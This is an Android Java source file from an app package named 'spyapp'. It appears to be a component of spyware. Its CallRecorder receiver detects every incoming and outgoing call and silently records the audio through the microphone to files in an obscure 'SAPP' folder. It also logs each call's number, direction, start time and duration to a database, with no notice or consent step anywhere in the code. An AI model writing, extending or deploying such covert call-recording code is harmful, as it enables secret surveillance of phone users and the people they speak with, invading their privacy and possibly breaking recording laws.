package com.example.spyapp;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallRecorder extends BroadcastReceiver {
  
	static final String TAG="CallRecorder:";
    static DatabaseHandler dbhandler ;

	public static int lastState = TelephonyManager.CALL_STATE_IDLE;

	//The receiver will be recreated whenever android feels like it.  We need a static variable to remember data between instantiations
    static PhonecallStartEndDetector listener;
    String outgoingSavedNumber;
    protected Context savedContext;


    @Override
    public void onReceive(Context context, Intent intent) {
    //	Log.d(TAG,"CALL onReceive");
   	dbhandler = new DatabaseHandler(context);

        savedContext = context;
        if(listener == null){
            listener = new PhonecallStartEndDetector();
        }
       // Log.d(TAG,"intent:"+intent.getAction());
        //We listen to two intents.  The new outgoing call only tells us of an outgoing call.  We use it to get the number.
        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL"))
        {
       // 	Log.d(TAG,"New_OUTGOING_CALL");
            listener.setOutgoingNumber(intent.getExtras().getString("android.intent.extra.PHONE_NUMBER"));
            return;
        }

        //The other intent tells us the phone state changed.  Here we set a listener to deal with it
        TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE); 
        telephony.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
    }


    //Deals with actual events
    public static class PhonecallStartEndDetector extends PhoneStateListener {
    	static boolean isIncoming = false;
    	static boolean wasRinging = false;
    	static boolean callInProgress=false;
        static long outgoing_start_time,outgoing_end_time=0;  
        static long incoming_start_time,incoming_end_time=0;  
        static long incoming_call_duration,outgoing_call_duration=0;
        static String file_name;
        Date callStartTime;
        static String outgoingnumber;  //because the passed incoming is only valid in ringing
        static MediaRecorder callrecorder;
        
        public PhonecallStartEndDetector() {
        	
       
        }

        //The outgoing number is only sent via a separate intent, so we need to store it out of band
        public void setOutgoingNumber(String number){
            outgoingnumber = number;
    //        Log.d(TAG,"DIALED NUMBER:"+savedNumber);
        }

       
        //Function to return the filename of the recording based on the current time
        String getFilename() {
            String filepath = Environment.getExternalStorageDirectory().getPath();
            File file = new File(filepath,"SAPP");

            if (!file.exists()) {
                file.mkdirs();
            }
            Log.d(TAG,"Filename"+file.getAbsolutePath() + "/" + System.currentTimeMillis() + ".3gp");
            return (file.getAbsolutePath() + "/" + System.currentTimeMillis() + ".3gp");
        }

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
          	

            super.onCallStateChanged(state, incomingNumber);
            if(lastState == state){
                //No change, debounce extras
                return;
            }
            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:
                	if(lastState==TelephonyManager.CALL_STATE_IDLE)
                	{
                		isIncoming = true;
                        Log.d(TAG,"Incoming call from:"+incomingNumber);
              //      callStartTime = new Date();
             //       savedNumber = incomingNumber;
                		Log.d(TAG,"INCOMING CALL : RINGING");
                		lastState=TelephonyManager.CALL_STATE_RINGING;
                	}
                	else
                	{
                		isIncoming=false;
                		Log.d(TAG,"OUTGOING CALL : RINGING");
                        lastState=TelephonyManager.CALL_STATE_RINGING;
                	}
      //              onIncomingCallStarted(incomingNumber, callStartTime);
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                	
                		if (lastState==TelephonyManager.CALL_STATE_RINGING)
                			{
                    			Log.d(TAG,"INCOMING CALL : PICKED");
                    			callrecorder=new MediaRecorder();
                    			callrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    		    callrecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    			callrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    			file_name=getFilename();
                    			callrecorder.setOutputFile(file_name);
                    			incoming_start_time=System.currentTimeMillis();
                    			try {
    								callrecorder.prepare();
    	                			callrecorder.start();
    							} catch (IllegalStateException e) {
    								// TODO Auto-generated catch block
    								e.printStackTrace();
    							} catch (IOException e) {
    								// TODO Auto-generated catch block
    								e.printStackTrace();
    							}
                    			
                			}
                		
                		else
                		{
                			Log.d(TAG,"OUTGOING CALL : DIALING :"+outgoingnumber);
                			outgoing_start_time=System.currentTimeMillis();
                			callrecorder=new MediaRecorder();
                			callrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                		    callrecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                			callrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                			file_name=getFilename();
                			callrecorder.setOutputFile(file_name);
                			try {
								callrecorder.prepare();
	                			callrecorder.start();
							} catch (IllegalStateException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
                			
                		}
                	
                    	lastState=TelephonyManager.CALL_STATE_OFFHOOK;

                    //Transition of ringing->offhook are pickups of incoming calls.  Nothing donw on them
            /*        if(lastState != TelephonyManager.CALL_STATE_RINGING){
                        isIncoming = false;
                        callStartTime = new Date();
                        Log.d(TAG,"OFFHOOK");

           //             onOutgoingCallStarted(savedNumber, callStartTime);                      
                    }*/
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                    if(lastState == TelephonyManager.CALL_STATE_OFFHOOK){
                    	if(isIncoming)
                    	{
                    		if (System.currentTimeMillis()-incoming_start_time>1000)
                    		{	
                    		Log.d(TAG,"INCOMING CALL : ENDED");
                    		callrecorder.stop();
                    		incoming_end_time=System.currentTimeMillis();
                    		incoming_call_duration=incoming_end_time-incoming_start_time;
                    		dbhandler.insertcallintodb(incoming_start_time, 1, incoming_call_duration,incomingNumber, file_name);
                    	//	Log.d(TAG,"Incoming Call Duration"+Long.toString(incoming_call_duration));
                    		isIncoming=false;
                    		lastState=TelephonyManager.CALL_STATE_IDLE;
                    		incoming_call_duration=0;
                    		incoming_start_time=0;
                    		incoming_end_time=0;
                    		}
                    	}
                    	else
                    	{
                    		//This is because immediately after off_hook, 
                    		//idle is called by android.
                    		//so in order to detect the actual hangup,
                    		//we wait for the idle which happens not immedaitely after
                    		//offhook,but after a few seconds.
                    		if (System.currentTimeMillis()-outgoing_start_time>1000)
                    		{	
                    		Log.d(TAG,"OUTGOING CALL : ENDED");
                    		callrecorder.stop();
                    		outgoing_end_time=System.currentTimeMillis();
                    		outgoing_call_duration=outgoing_end_time-outgoing_start_time;                    		
                        //   	Log.d(TAG,"Outgoing Call Duration"+Long.toString(outgoing_call_duration));
                    		dbhandler.insertcallintodb(outgoing_start_time, 2, outgoing_call_duration,outgoingnumber, file_name);
                    		lastState=TelephonyManager.CALL_STATE_IDLE;
                    		outgoing_call_duration=0;
                    		outgoing_start_time=0;
                    		outgoing_end_time=0;
                    		}
                    	
                    		
                    	}
                    }
          
                    break;
            }
        }

    }
	
}
